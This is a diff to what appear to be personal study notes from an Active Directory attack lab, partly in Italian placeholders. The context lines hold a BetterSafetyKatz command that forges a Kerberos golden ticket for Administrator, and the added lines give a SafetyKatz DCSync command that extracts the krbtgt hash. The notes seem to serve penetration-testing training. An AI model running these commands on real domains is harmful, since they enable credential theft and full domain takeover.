@@ -44,3 +44,10 @@ Just use BetterSafetyKatz
 ```powershell
 > C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<NOME DOMINIO> /sid:<SID DC(lsa dump safetykatz> /aes256:<AES KRBTGT> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 ```
+
+### **execute the DCSync attack to pull hashes of the krbtgt user**
+Now use safetykatz to extract the hash of any user
+```powershell
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+```
+![[Pasted image 20231025125418.png]]
